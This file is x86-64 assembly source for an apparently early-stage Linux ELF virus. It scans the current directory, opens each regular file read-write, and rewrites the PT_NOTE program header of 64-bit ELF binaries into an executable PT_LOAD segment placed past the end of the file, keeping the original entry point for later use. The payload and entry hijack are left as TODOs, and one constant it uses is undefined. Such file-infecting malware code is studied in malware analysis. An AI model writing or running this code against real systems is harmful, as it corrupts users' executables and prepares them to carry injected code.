;; -*- mode: nasm; fill-column: 80; comment-column: 80; -*-

global _start

SYS_EXIT       equ 60
SYS_GETDENTS64 equ 217
SYS_OPEN       equ 2
SYS_CLOSE      equ 3
SYS_FSTAT      equ 5
SYS_MMAP       equ 9
SYS_MUNMAP     equ 11

OFF_DIRENT_DRECLEN equ 16                                   ; dirent.d_reclen
OFF_DIRENT_DTYPE   equ 18                                   ; dirent.d_type
OFF_DIRENT_DNAME   equ 19                                   ; dirent.d_name

STAT_OFF_STSIZE equ 48                                      ; stat.st_size

O_RDONLY equ 0
O_RDWR   equ 2
DT_REG   equ 8

ST_DIRENT_SIZE_OFF equ 1024                                 ; long
ST_OPEN_FILE_FD    equ 1032                                 ; int
ST_OPEN_FILE_STAT  equ 1040                                 ; 144 bytes
ST_OPEN_FILE_ADDR  equ 1184                                 ; ptr

PROT_READ  equ 1
PROT_WRITE equ 2
MAP_SHARED equ 1

PT_LOAD    equ 1
PT_NOTE    equ 4
ELFCLASS64 equ 2
PF_X       equ 1
PF_R       equ 4

OFF_EHDR_IDENT_CLASS equ 4                                  ; elf.ehdr.e_ident[4]
OFF_EHDR_ENTRY       equ 24                                 ; elf.ehdr.e_entry
OFF_EHDR_PHOFF       equ 32                                 ; elf.ehdr.e_phoff
OFF_EHDR_PHENTSIZE   equ 54                                 ; elf.ehdr.e_phentsize
OFF_EHDR_PHNUM       equ 56                                 ; elf.ehdr.e_phnum

OFF_PHDR_FLAGS       equ 4                                  ; elf.phdr.p_flags
OFF_PHDR_VADDR       equ 16                                 ; elf.phdr.p_vaddr
OFF_PHDR_PADDR       equ 24                                 ; elf.phdr.p_paddr
OFF_PHDR_FILESZ      equ 32                                 ; elf.phdr.p_paddr
OFF_PHDR_MEMSZ       equ 40                                 ; elf.phdr.p_paddr

SECTION .data

SECTION .text

_start:
    push rsp
    push rdx
    sub  rsp, 5000
    mov  r15, rsp

load_dir:
    ; calls getdents64 to get a list of all the files of the current directory. does not recurse.
    ;
    ; NOTE(phos): i believe it won't work on directories with a considerable amount of files
    ; (e.g. /bin/) since it's only allocating 1024 bytes for the array of results.
    push "."
    mov rax, SYS_OPEN
    mov rdi, rsp
    mov rsi, O_RDONLY
    xor rdx, rdx
    syscall

    pop  rdi
    test rax, rax
    js   end
    
    mov rdi, rax
    lea rsi, [r15]
    mov rdx, 1024
    mov rax, SYS_GETDENTS64
    syscall

    test rax, rax
    js   end

    mov qword [r15 + ST_DIRENT_SIZE_OFF], rax

    mov rax, SYS_CLOSE
    syscall

    xor rcx, rcx
file_loop:
    ; loop over each dirent structure
    push rcx

    cmp byte [r15 + rcx + OFF_DIRENT_DTYPE], DT_REG
    jne file_loop_continue      ; if the file is not a regular file, skip it

open_file:
    ; open() the file pointed by dirent.d_name, then fstat() it in order to get its size. The size
    ; is needed to mmap() the file into memory.
    mov rax, SYS_OPEN
    lea rdi, byte [r15 + rcx + OFF_DIRENT_DNAME]
    mov rsi, O_RDWR
    xor rdx, rdx
    syscall

    test rax, rax
    js   file_loop_continue
    mov qword [r15 + ST_OPEN_FILE_FD], rax

    mov rdi, rax
    lea rsi, qword [r15 + ST_OPEN_FILE_STAT]
    mov rax, SYS_FSTAT
    syscall

    test rax, rax
    js file_loop_continue
    
    xor rax, rax
    mov rax, SYS_MMAP
    mov rdi, 0
    mov rsi, qword [r15 + ST_OPEN_FILE_STAT + STAT_OFF_STSIZE]
    mov rdx, PROT_READ | PROT_WRITE
    mov r10, MAP_SHARED
    mov r8,  qword [r15 + ST_OPEN_FILE_FD]
    mov r9,  0
    syscall

    ; test rax for the range between -1=..=-4095, the error range
    test rax, rax
    jns  open_file_end
    cmp  rax, -4095
    jge  close_file

open_file_end:
    mov qword [r15 + ST_OPEN_FILE_ADDR], rax
    mov r14, rax

is_elf:
    cmp dword [r14], 0x464c457f
    jne unmap_file

is_x64:
    cmp byte [r14 + OFF_EHDR_IDENT_CLASS], ELFCLASS64
    jne unmap_file

process_file:
    mov r13, qword [r14 + OFF_EHDR_ENTRY]                 ; store original entry point for later use

    xor rcx, rcx
search_ptnote:
    ; compute the offset from the first phdr to the current phdr
    xor rax, rax
    mov ax,  word [r14 + OFF_EHDR_PHENTSIZE]
    mul rcx

    ; add the offset to get to the first phdr
    add rax, [r14 + OFF_EHDR_PHOFF]

    cmp dword [r14 + rax], PT_NOTE
    je  infect_ptnote

    inc  rcx
    cmp  cx, word [r14 + OFF_EHDR_PHNUM]                    ; check if rcx == ehdr.phnum
    je   unmap_file                                         ; if so, no ptnote section in the binary
    jmp  search_ptnote
    
infect_ptnote:
    mov dword [r14 + rax], PT_LOAD                          ; change type to PT_LOAD
    mov dword [r14 + rax + OFF_PHDR_FLAGS], PF_X | PF_R     ; make segment executable

    mov rcx, [r15 + ST_OPEN_FILE_STAT + STAT_OFF_STSIZE]
    mov [r14 + rax + OFF_PHDR_OFF], rcx ; set the segment offset to the end of the original file

    add rcx, 0xc0000000
    mov [r14 + rax + OFF_PHDR_VADDR], rcx      ; set phdr.p_vaddr to a region that is unlikely to be
                                               ; mapped by anything else

    ; TODO(phos): recompute filesz
    ; TODO(phos): recompute memsz

unmap_file:
    mov rax, SYS_MUNMAP
    mov rdi, qword [r15 + ST_OPEN_FILE_ADDR]
    mov rsi, qword [r15 + ST_OPEN_FILE_STAT + STAT_OFF_STSIZE]
    syscall

    ; TODO(phos): need to handle this error or just let it fallthrough?
   
close_file:
    mov rax, SYS_CLOSE                                       ; once the file is mmap()'ed, it can be
                                                             ; closed without any side effects.
    mov rdi, qword [r15 + ST_OPEN_FILE_FD]
    syscall

file_loop_continue:
    pop rcx
    add cx,  word [r15 + rcx + OFF_DIRENT_DRECLEN]
    cmp rcx, [r15 + ST_DIRENT_SIZE_OFF]
    jne file_loop

end:
    pop rdx
    pop rsp

    mov rdi, 0
    mov rax, SYS_EXIT 
	syscall
